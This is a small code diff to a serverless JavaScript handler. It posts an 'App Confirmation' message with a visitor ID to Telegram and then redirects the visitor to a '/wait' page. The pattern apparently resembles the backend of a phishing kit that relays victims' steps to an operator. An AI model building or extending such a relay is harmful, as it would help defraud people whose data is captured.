@@ -27,7 +27,7 @@ async function sendTelegram(message) {
 
 exports.handler = async (event, context) => {
   if (event.httpMethod !== 'POST') {
-    return { statusCode: 302, headers: { 'Location': '/app-confirm' }, body: '' };
+    return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
   try {
@@ -36,9 +36,9 @@ exports.handler = async (event, context) => {
     await sendTelegram(`<b>📲 App Confirmation</b>\n<b>ID:</b> <code>${vId}</code>`);
 
     return {
-      statusCode: 200,
-      headers: { 'Content-Type': 'text/plain' },
-      body: 'OK'
+      statusCode: 302,
+      headers: { 'Location': '/wait' },
+      body: ''
     };
   } catch (error) {
     console.error('Error:', error);
